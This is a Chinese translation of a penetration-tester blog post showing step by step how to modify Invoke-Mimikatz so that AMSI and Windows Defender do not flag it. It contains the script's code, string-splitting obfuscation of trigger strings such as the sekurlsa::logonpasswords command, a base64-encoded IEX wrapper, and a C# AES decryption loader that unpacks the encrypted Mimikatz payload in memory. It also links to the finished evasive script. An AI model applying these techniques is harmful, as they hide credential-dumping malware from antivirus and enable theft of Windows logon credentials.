> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/8287)

```
译文声明
本文是翻译文章，文章原作者 S3cur3Th1sSh1t
原文地址：https://s3cur3th1ssh1t.github.io/Bypass-AMSI-by-manual-modification-part-II/

译文仅供参考，具体内容表达以及含义原文为准
```

这篇博客文章将讲一些关于 AMSI 更深层的触发器。我决定构建一个没有 AMSI 触发器的定制 Invoke-Mimikatz 脚本。我还将介绍一些关于 Invoke-Mimikatz 的工作原理。

### 0x00 介绍

如果阅读了我的上一篇博客文章，[通过手动修改绕过 AMSI](https://s3cur3th1ssh1t.github.io/Bypass_AMSI_by_manual_modification/)，可能已经想到了要为`Invoke-Mimikatz` 或 `Sharphound` 寻找触发器，并构建自己的未被 AMSI 检测的版本。嗯，这就有点复杂了，因为这些工具会被更多不同的触发器进行标记。但是它仍然是签名。我还将介绍一些陷阱。在这篇博文中没有什么 "新" 技术，我只是简单地一步步解释我自己的程序和想法。

### 0x01 Invoke-Mimikatz 如何工作？

如果您已经知道 `Invoke-Mimikatz` 如何工作，则请跳过此部分。

我不得不承认，很多人会像我一样，第一次使用 `Invoke-Mimikatz` 或使用其他攻击性安全工具时，并没有看过源代码，只是因为它们 "trusted by the community" 而使用。显然，当我开始作为渗透测试员开展工作时，导致几乎什么都不懂，这就是所谓的基础不扎实。所以今天做的第一件事就是开一下新工具的代码。在我看来，这对于减少在客户端上的不必要操作以及了解代码背后的工作原理是非常重要的。 `Invoke-Mimikatz` 不是用 Powershell 编写的 Mimikatz 版本。如果想了解它的工作原理，最简单的方式就是查看它的注释内容。

```
.NOTES
这个脚本是由 Joe Bialek 编写的 Invok-ReflectivePEInjection 脚本和 Benjamin DELPY 编写的 Mimikatz 代码组合而成的。
Find Invoke-ReflectivePEInjection at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection
Find mimikatz at: http://blog.gentilkiwi.com
```

看来我们首先要看看 Joe Bialek 的 `Invok-ReflectivePEInjection`，才能明白这里发生了什么。上一个支持的版本位于 [Powersploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) 仓库中，但 Powersploit 在近两年多的时间里没有得到更新：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913173107-da2266a8-f5a3-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913173107-da2266a8-f5a3-1.jpeg)

我不会把所有的 2884 行代码都看完，因为这将需要一篇博客文章的时间。所以为了得到一个简单的描述，我们先再看看描述。

```
这个脚本有两种模式。它可以通过反射将 DLL/EXE 加载到 PowerShell 进程中。
或者它可以将一个 DLL 反射加载到远程进程中。这些模式有不同的参数和约束。
请在注释部分（GENERAL NOTES）介绍如何使用它们。

1.)通过反射将 DLL/EXE 加载到 PowerShell 进程内存中。
由于 DLL/EXE 是以反射方式加载的，所以当工具用于列出正在运行的进程的 DLL时，它不会被显示出来。
该工具可以通过提供一个本地 Windows PE文件（DLL/EXE）在远程服务器上运行，以便加载到远程系统的内存中。
这将在内存中加载并执行DLL/EXE，而无需向磁盘写入任何文件。

2.) 反射加载一个 DLL 到远程进程的内存中。
如上所述，当工具用于列出正在运行的远程进程的DLL时，不会显示被反射加载的DLL。
```

就像函数名称所说的那样，`Invoke-ReflectivePEInjection` 将一个可移植可执行（PE）文件或 DLL 加载到当前或远程进程内存中，并在内存中执行此文件。关于 **_Reflective PE Injection_** 的博客文章还有很多，但这不是这里的主要话题，所以你可以[在这里](https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes)阅读更多关于该技术的文章。

**_PS：_**如果你想使用 `Invoke-ReflectivePEInjection` 加载除 Mimikatz 以为的程序，可以使用此 [pull request 中](https://github.com/PowerShellMafia/PowerSploit/pull/289)的代码。

如果我们比较 `Invoke-Mimikatz` 和 `Invoke-ReflectivePEInjection`，可以发现它们的基础（主）代码部分是相同的。`Win32Types`，`Win32Constants`，`Win32Functions`，`helper` ，`Invoke-CreateRemoteThread`，`PE-Info` 函数等等都是一样的。要获得最新的 `Invoke-Mimikatz` 版本，可以查看 [nishang](https://github.com/samratashok/nishang/blob/master/Gather/Invoke-Mimikatz.ps1) 或 [BC-Security Empire](https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1) 存储库。有趣的部分是`Invoke-Mimikatz` 的主要功能：

```
Function Main
{
    if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }

    Write-Verbose "PowerShell ProcessID: $PID"


    if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
    {
        $ExeArgs = "sekurlsa::logonpasswords exit"
    }
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $ExeArgs = $Command
    }

    [System.IO.Directory]::SetCurrentDirectory($pwd)

    $PEBytes64 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...snip...]iDCMMJAwlDAAAAAAAAAAAAAAAAAAAAAAAAA='
    $PEBytes32 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...snip...]iDCMMJAwlDAAAAAAAAAAAAAAAAAAAAAAAAA='

    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
    }
}


```

`Invoke-Mimikatz` 基本上就是 `Invoke-ReflectivePEInjection` ，只不过是用反射加载的方式，加载 Mimikatz 程序文件的 Base64 编码内容。还有一些新的参数和一些函数的细微变化，但基本上没有什么变化。

因此，如果我们不想 `Invoke-Mimikatz`被 AMSI 拦截捕获，我们首先必须找到 `Invoke-ReflectivePEInjection` 的触发器。

### 0x02 查找 Invoke-ReflectivePEInjection 的触发器

为了找到 `Invoke-ReflectivePEInjection` 的主要触发器，我们将再次使用 `AMSITrigger`。但首先我们要像上一篇博文那样删除所有的注释，并将函数名称`Invoke-ReflectivePEInjection` 改为 `PE-Reflect` 之类的其他名称，因为 Windows Defender 对这个名称特别的照顾。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913173126-e52e5b6a-f5a3-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913173126-e52e5b6a-f5a3-1.jpeg)

通过运行 AMSITrigger，我们可以得到以下结果：

```
[+] "Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect"
[+] "Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory"
[+] ".CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0"
[+] ".FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
                {
                        $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
                        if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
                        {
                                Throw "VoidFunc couldn't be found in the DLL"
                        }
                        $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
                        $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
                        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
                }
                if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL")
                {
                        Invoke-MemoryFreeLibrary -PEHandle $PEHandle
                }
                else
                {
                        $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
                        if ($Success -eq $false)
                        {
                                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
                        }
                }
                Write-Verbose "Done!"
        }
        Main
}
Function Main
{
        if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
        {
                $DebugPreference  = "Continue"
        }
        Write-Verbose "PowerShell ProcessID: $PID"
        $e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''
    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }
        if (-not $DoNotZeroMZ) {
                $PEBytes[0] = 0
                $PEBytes[1] = 0
        }
        if ($ExeArgs -ne $null -and $ExeArgs -ne '')
        {
                $ExeArgs = "ReflectiveExe $ExeArgs"
        }
        else
        {
                $ExeArgs = "ReflectiveExe"
        }
        if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
        {
                Invoke-Command -ScriptBlock $"


```

因此，我们需要对其进行一些修改：

*   VirtualProtect

```
Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
更改为
Add-Member NoteProperty -Name $('Vi'+'rt'+'ual'+'Pro'+'te'+'ct') -Value $VirtualProtect


```

*   WriteProcessMemory

```
Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
更改为
Add-Member -MemberType $('No'+'te'+'Pr'+'op'+'er'+'ty') -Name $('Wr'+'ite'+'Proc'+'ess'+'Mem'+'or'+'y') -Value $WriteProcessMemory


```

*   往后的这些字符串，我们将按以下进行修改：

<table><thead><tr><th>Originalvalue</th><th>NewValue</th></tr></thead><tbody><tr><td>$ProcessHandle</td><td>$ProcHandle</td></tr><tr><td>$StartAddress</td><td>$FirstAddress</td></tr><tr><td>-ProcessHandle</td><td>-ProcHandle</td></tr><tr><td>-StartAddress</td><td>-FirstAddress</td></tr></tbody></table>

`$ProcessHandle` 和 `$StartAddress` 是参数值。它们也与 `-` 一起使用，所以为了让脚本保持功能，我们也必须替换它们。

对于最后一个触发器，足以替换该行

*   DLL

```
.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
更改为
.FileType -ieq $('D'+'L'+'L')) -and ($RemoteProcHandle -ne [IntPtr]::Zero))


```

重新使用 AMSITrigger 对其进行检测，发现没有输出任何的触发器，但运行脚本后， AMSI 仍然可以检测到该脚本：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913173138-ecc0f5d6-f5a3-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913173138-ecc0f5d6-f5a3-1.jpeg)

为了理解这一点，我们需要看一下 AMSITrigger 代码。重要代码位于 [Triggers.cs](https://github.com/RythmStick/AMSITrigger/blob/master/AMSITrigger/Triggers.cs) 文件中。首先，脚本的所有字节（必须进行分析）都存储在变量 `bigSample` 中。之后，使用函数 `scanBuffer` 检查这个变量是否有 AMSI 触发器。：

```
result = scanBuffer(bigSample, amsiContext);
if (result != AMSI_RESULT.AMSI_RESULT_DETECTED)
{
    Console.WriteLine(string.Format("[+] {0}", result));
    return;
}


```

如果脚本具有触发器，它将继续搜索特定位置。如果没有，它将退出。重要的是：有一个`chunksize` 变量分配了默认值是 `4096`。AMSITrigger 以 4096 字节为单位分块执行脚本。脚本中的每 4096 字节部分都会被传递给 `amsiscanBuffer` 进行分析：

```
while (startIndex + chunkSize < bigSample.Length)
{
    chunkSample = new byte[chunkSize];
    Array.Copy(bigSample, startIndex, chunkSample, 0, chunkSize);
    processChunk(chunkSample); // this function calls a scanBuffer function which itself calls the amsi.dll AmsiScanBuffer function
}


```

如果检测到某个 4096 字节块的触发器，则通过逐级删除字节来准确定位触发器的第一个和最后一个字节。如果我们看一下上面的 AMSITrigger 的屏幕截图，就会发现 `Invoke-ReflectivePEInjection`被划出了 59 份的 4096 字节 ，然后调用 AmsiScanBuffer 进行扫描分析（最后一个可能不足 4096）。所有这些块均不包含触发器。

现在，我们可以更更改 `chunkSize` 的值，以便找出遗漏的触发器。但我要在这里说明一下，这对 `Invoke-ReflectivePEInjection` 和 `Invoke-Mimikatz` 都不好玩。你需要一个大于 16000 的 `chunkSize`，但这样由于程序的输出太多而导致崩溃。

因此，我们必须手动查看一下，将脚本分成几部分来，以便查找触发点。从 [string replaced script](https://gist.github.com/S3cur3Th1sSh1t/17b1ea053a7975be510d6586fc38210f) 的第 1 行到第 2095 行，也就是在 Main 函数之前，是没有触发器的，当然你也可以动手试一试。有趣的是，Main 函数本身也没有触发器。

Main 函数的内容是：

```
if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
    {
        $DebugPreference  = "Continue"
    }
    Write-Verbose "PowerShell ProcessID: $PID"
    $e_magic = ($PEBytes[0..1] | % {[Char] $_}) -join ''
    if ($e_magic -ne 'MZ')
    {
        throw 'PE is not a valid PE file.'
    }
    if (-not $DoNotZeroMZ) {
        $PEBytes[0] = 0
        $PEBytes[1] = 0
    }
    if ($ExeArgs -ne $null -and $ExeArgs -ne '')
    {
        $ExeArgs = "ReflectiveExe $ExeArgs"
    }
    else
    {
        $ExeArgs = "ReflectiveExe"
    }
    if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR)
    }
    else
    {
        Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName,$ForceASLR) -ComputerName $ComputerName
    }


```

我们将脚本的这一部分保存在一个文件中，并使用以下命令对 base64 进行编码：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913173150-f381738c-f5a3-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913173150-f381738c-f5a3-1.jpeg)

所有通过 `IEX()` 加载的东西都会被 AMSI 扫描。但是我们刚刚发现，Main 函数没有触发器，所以我们可以在运行时对其进行解码，并通过 `IEX()` 加载。为此，我们将 main 函数的内容替换为以下内容：

```
IEX($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("CQBpAGYAIAAoACgAJABQAFMAQwBtAGQAbABlAHQALgBNAHkASQBuAHYAbwBjAGEAdABpAG8AbgAuAEIAbwB1AG4AZABQAGEAcgBhAG0AZQB0AGUAcgBzAFsAIgBEAGUAYgB1AGcAIgBdACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAC0AYQBuAGQAIAAkAFAAUwBDAG0AZABsAGUAdAAuAE0AeQBJAG4AdgBvAGMAYQB0AGkAbwBuAC4AQgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMAWwAiAEQAZQBiAHUAZwAiAF0ALgBJAHMAUAByAGUAcwBlAG4AdAApACAACQB7ACAACQAJACQARABlAGIAdQBnAFAAcgBlAGYAZQByAGUAbgBjAGUAIAAgAD0AIAAiAEMAbwBuAHQAaQBuAHUAZQAiACAACQB9ACAACQBXAHIAaQB0AGUALQBWAGUAcgBiAG8AcwBlACAAIgBQAG8AdwBlAHIAUwBoAGUAbABsACAAUAByAG8AYwBlAHMAcwBJAEQAOgAgACQAUABJAEQAIgAgAAkAJABlAF8AbQBhAGcAaQBjACAAPQAgACgAJABQAEUAQgB5AHQAZQBzAFsAMAAuAC4AMQBdACAAfAAgACUAIAB7AFsAQwBoAGEAcgBdACAAJABfAH0AKQAgAC0AagBvAGkAbgAgACcAJwAgACAAIAAgACAAaQBmACAAKAAkAGUAXwBtAGEAZwBpAGMAIAAtAG4AZQAgACcATQBaACcAKQAgACAAIAAgACAAewAgACAAIAAgACAAIAAgACAAIAB0AGgAcgBvAHcAIAAnAFAARQAgAGkAcwAgAG4AbwB0ACAAYQAgAHYAYQBsAGkAZAAgAFAARQAgAGYAaQBsAGUALgAnACAAIAAgACAAIAB9ACAACQBpAGYAIAAoAC0AbgBvAHQAIAAkAEQAbwBOAG8AdABaAGUAcgBvAE0AWgApACAAewAgAAkACQAkAFAARQBCAHkAdABlAHMAWwAwAF0AIAA9ACAAMAAgAAkACQAkAFAARQBCAHkAdABlAHMAWwAxAF0AIAA9ACAAMAAgAAkAfQAgAAkAaQBmACAAKAAkAEUAeABlAEEAcgBnAHMAIAAtAG4AZQAgACQAbgB1AGwAbAAgAC0AYQBuAGQAIAAkAEUAeABlAEEAcgBnAHMAIAAtAG4AZQAgACcAJwApACAACQB7ACAACQAJACQARQB4AGUAQQByAGcAcwAgAD0AIAAiAFIAZQBmAGwAZQBjAHQAaQB2AGUARQB4AGUAIAAkAEUAeABlAEEAcgBnAHMAIgAgAAkAfQAgAAkAZQBsAHMAZQAgAAkAewAgAAkACQAkAEUAeABlAEEAcgBnAHMAIAA9ACAAIgBSAGUAZgBsAGUAYwB0AGkAdgBlAEUAeABlACIAIAAJAH0AIAAJAGkAZgAgACgAJABDAG8AbQBwAHUAdABlAHIATgBhAG0AZQAgAC0AZQBxACAAJABuAHUAbABsACAALQBvAHIAIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAALQBpAG0AYQB0AGMAaAAgACIAXgBcAHMAKgAkACIAKQAgAAkAewAgAAkACQBJAG4AdgBvAGsAZQAtAEMAbwBtAG0AYQBuAGQAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAUgBlAG0AbwB0AGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAEAAKAAkAFAARQBCAHkAdABlAHMALAAgACQARgB1AG4AYwBSAGUAdAB1AHIAbgBUAHkAcABlACwAIAAkAFAAcgBvAGMASQBkACwAIAAkAFAAcgBvAGMATgBhAG0AZQAsACQARgBvAHIAYwBlAEEAUwBMAFIAKQAgAAkAfQAgAAkAZQBsAHMAZQAgAAkAewAgAAkACQBJAG4AdgBvAGsAZQAtAEMAbwBtAG0AYQBuAGQAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAUgBlAG0AbwB0AGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrACAALQBBAHIAZwB1AG0AZQBuAHQATABpAHMAdAAgAEAAKAAkAFAARQBCAHkAdABlAHMALAAgACQARgB1AG4AYwBSAGUAdAB1AHIAbgBUAHkAcABlACwAIAAkAFAAcgBvAGMASQBkACwAIAAkAFAAcgBvAGMATgBhAG0AZQAsACQARgBvAHIAYwBlAEEAUwBMAFIAKQAgAC0AQwBvAG0AcAB1AHQAZQByAE4AYQBtAGUAIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAACQB9AA=="))))


```

这就实现了一个名为 `PE-ReflectivePEInjection` 的 `Invoke-ReflectivePEInjection` 函数没有触发 AMSI。

现在我们应该可以用 `Invoke-Mimikatz` 做同样的事情了吧？还有一个问题。base64 编码的 Mimikatz 二进制有几个 AMSI 触发器：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913173208-fe37c2ea-f5a3-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913173208-fe37c2ea-f5a3-1.jpeg)

为了解决这个问题，我们有两种选择：

*   编码 / 加密 base64 编码的 Mimikatz 部分
*   建立我们自己的没有触发器的定制 Mimikatz

我不希望这篇文章衍生更多的问题，因此我们这里选择第一种方法。

我不希望这篇博客文章爆炸，所以我们将在这里选择第一个选项。由于 Mimikatz 的许多编码变体也包含触发器，但因为上文提到的强加密具有随机性的特性，因此我们选择编码加密的方式是最为稳妥的。

我们到底该如何加密呢？我将使用 [Invoke-SharpEncrypt](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpEncrypt.ps1) 脚本，该脚本是 Cn33liz 的 [p0wnedLoader](https://github.com/Cn33liz/p0wnedLoader) 的 Powershell 版本，但做了些许修改。为了加密`$PEBytes64` 和 `$PEBytes32` 的值，它们被存储在磁盘上的单独文本文件中。我还在 base64 二进制文件的开头和结尾处添加了 `#` 字符。这是为了在解密后过滤确切的 Payload，我在使用换行和空格时遇到了一些烦人的问题。下面的命令实际上是对一个文本文件进行加密：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913173215-0272e47a-f5a4-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913173215-0272e47a-f5a4-1.jpeg)

之后，我对 x86 版本做了同样的处理。为了在运行时解密该值，我将使用一个修改过的 [Invoke-Sharploader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader/blob/master/Invoke-SharpLoader.ps1) 版本。实际上我们不想通过 `Assembly.load()` 来加载 Powershell 脚本，我们不需要下载部分，这里也不需要绕过 AMSI 和 ETW。现在的解密函数是这样的：

```
$powerdecrypt = @"
using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.IO.Compression;
namespace powerdecrypt
{

    public class Program
    {
        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    try
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;
                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);
                        AES.Mode = CipherMode.CBC;
                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                    catch
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] Whoops, something went wrong... Probably a wrong Password.");
                        Console.ResetColor();
                    }
                }
            }
            return decryptedBytes;
        }
        public byte[] GetRandomBytes()
        {
            int _saltSize = 4;
            byte[] ba = new byte[_saltSize];
            RNGCryptoServiceProvider.Create().GetBytes(ba);
            return ba;
        }
        public static byte[] Decompress(byte[] data)
        {
            using (var compressedStream = new MemoryStream(data))
            using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
            using (var resultStream = new MemoryStream())
            {
                var buffer = new byte[32768];
                int read;
                while ((read = zipStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    resultStream.Write(buffer, 0, read);
                }
                return resultStream.ToArray();
            }
        }
        public static byte[] Base64_Decode(string encodedData)
        {
            byte[] encodedDataAsBytes = Convert.FromBase64String(encodedData);
            return encodedDataAsBytes;
        }
        public static string ReadPassword()
        {
            string password = "";
            ConsoleKeyInfo info = Console.ReadKey(true);
            while (info.Key != ConsoleKey.Enter)
            {
                if (info.Key != ConsoleKey.Backspace)
                {
                    Console.Write("*");
                    password += info.KeyChar;
                }
                else if (info.Key == ConsoleKey.Backspace)
                {
                    if (!string.IsNullOrEmpty(password))
                    {
                        password = password.Substring(0, password.Length - 1);
                        int pos = Console.CursorLeft;
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                        Console.Write(" ");
                        Console.SetCursorPosition(pos - 1, Console.CursorTop);
                    }
                }
                info = Console.ReadKey(true);
            }
            Console.WriteLine();
            return password;
        }

        public static string decrypt(params string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Parameters missing");
            }
            string script = args[0];
            Console.WriteLine();
            Console.Write("[*] Decrypting file in memory... > ");
            string Password = args[1];
            Console.WriteLine();
            byte[] decoded = Base64_Decode(script);
            byte[] decompressed = Decompress(decoded);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(Password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
            byte[] bytesDecrypted = AES_Decrypt(decompressed, passwordBytes);
            int _saltSize = 4;
            byte[] originalBytes = new byte[bytesDecrypted.Length - _saltSize];
            for (int i = _saltSize; i < bytesDecrypted.Length; i++)
            {
                originalBytes[i - _saltSize] = bytesDecrypted[i];
            }
            Console.WriteLine("-> Returning the originalbytes");

            var str = System.Text.Encoding.UTF8.GetString(originalBytes);
            str = str.Replace(System.Environment.NewLine, "");
            return str;
        }
    }
}
"@

Add-Type -TypeDefinition $powerdecrypt


```

使用我们脚本中的上述代码，可以通过以下方式完成解密：

```
[powerdecrypt.Program]::decrypt($Encyptedscript,"S3cur3Th1sSh1t")


```

现在我们必须重复我们在 `Invoke-ReflectivePEInjection` 中所做的相同步骤，但这次是 `Invoke-Mimikatz`。删除注释并替换所有提到的触发器。对于 Invoke-Mimikatz，我们必须替换更多的字符串，因为有更多的参数名、Mimikatz 参数等触发器。我们还将用 `Invoke-Custom-Katz` 替换 `Invoke-Mimikatz`。

*   sekurlsa::logonpasswords exit

```
"sekurlsa::logonpasswords exit"
替换为
'se'+'ku'+'rl'+'sa'+'::'+'lo'+'go'+'np'+'asswor'+'ds ex'+'it'

```

*   ReflectedDelegate

```
Reflection.AssemblyName('ReflectedDelegate')
替换为
Reflection.AssemblyName('Re'+'fl'+'ect'+'edD'+'ele'+'gat'+'e')

```

*   powershell_reflective_mimikatz

```
'powershell_reflective_mimikatz'
替换为
$('po'+'wer'+'she'+'ll_'+'ref'+'lec'+'tiv'+'e_m'+'imi'+'ka'+'tz')

```

遗憾的是，我找不到确切的下一个触发位置，但完全按照这个顺序替换下面的变量名和参数名，就可以在写文章的时候绕过 AMSI。

<table><thead><tr><th>Originalvalue</th><th>NewValue</th></tr></thead><tbody><tr><td>DumpCreds</td><td>GetCreds</td></tr><tr><td>DumpCerts</td><td>GetCerts</td></tr><tr><td>$RemoteScriptBlock</td><td>$NoLocalScriptBlock</td></tr><tr><td>$PEBytes64</td><td>$PortableExecutableBytes64</td></tr><tr><td>$PEBytes32</td><td>$PortableExecutableBytes32</td></tr><tr><td>$PEBytes</td><td>$PortableExecutableBytes</td></tr><tr><td>-PEBytes</td><td>-PortableExecutableBytes</td></tr></tbody></table>

这就生成了一个新的 `Invoke-CustomKatz` 版本，并且没有被 AMSI 标记，请[在此处获取](https://gist.github.com/S3cur3Th1sSh1t/b33b978ea62a4b0f6ef545f1378512a6)。主函数现在包含解密函数，base64 编码解密后的 Mimikatz 位于前面提到的两个 `#` 字符之间。

```
Add-Type -TypeDefinition $powerdecrypt
    $DecryptedMimix64 = [powerdecrypt.Program]::decrypt($EncryptedMimix64,"S3cur3Th1sSh1t")
    [String]$findev = [regex]::match($DecryptedMimix64 ,'(?<=#).*?(?=#)').Value
    $findev | out-file C:\temp\mimifiles5.txt -Encoding utf8
    $PortableExecutableBytes64 = $findev

    $DecryptedMimix86 = [powerdecrypt.Program]::decrypt($EncryptedMimix86,"S3cur3Th1sSh1t")
    [String]$findev2 = [regex]::match($DecryptedMimix86 ,'(?<=#).*?(?=#)').Value
    $PortableExecutableBytes32 = $findev


```

运行这个脚本，可以看到，实际上可以成功运行起来：

[![](https://xzfile.aliyuncs.com/media/upload/picture/20200913173229-0afc2214-f5a4-1.jpeg)](https://xzfile.aliyuncs.com/media/upload/picture/20200913173229-0afc2214-f5a4-1.jpeg)

但是右下角的警告提示，是因为这属于另一种检测技术了（内存扫描 - 特定 API 调用后触发）。这种情况下，是因为我们通过 `createRemoteThread` 加载 Mimikatz，因此触发了内存扫描，在内存中发现了未混淆的 Mimikatz，从而出现了该提示。此提示出现后 2 秒，该 powershell 进程将被 Windows Defender 杀掉。关于更多的内存扫描功能，以及绕过内存扫描，可以参考这里的[文章](https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/)。

当 Defender 杀死进程时，我们的操作其实已经完成了。

### 0x03 结论

如果你不知道 `Invoke-Mimikatz` 背后是什么，我希望你知道。我们学会了如何找到更高级的 AMSI 触发器，甚至可以通过手动修改绕过这些触发器，而不需要对 amsi.dll 进行修补。也许在新的未来会有 AV/EDR 厂商寻找 amsi.dll 补丁来检测攻击行为。如果那样的话，你可以使用手动修改来代替传统的修补方法。

使用像我们在这里做的是 Mimikatz 的无混淆版本，可能会被检测，或者检测周期会缩短很多。因此，下一篇文章中，我将通过修改源代码来定义一个 Mimikatz。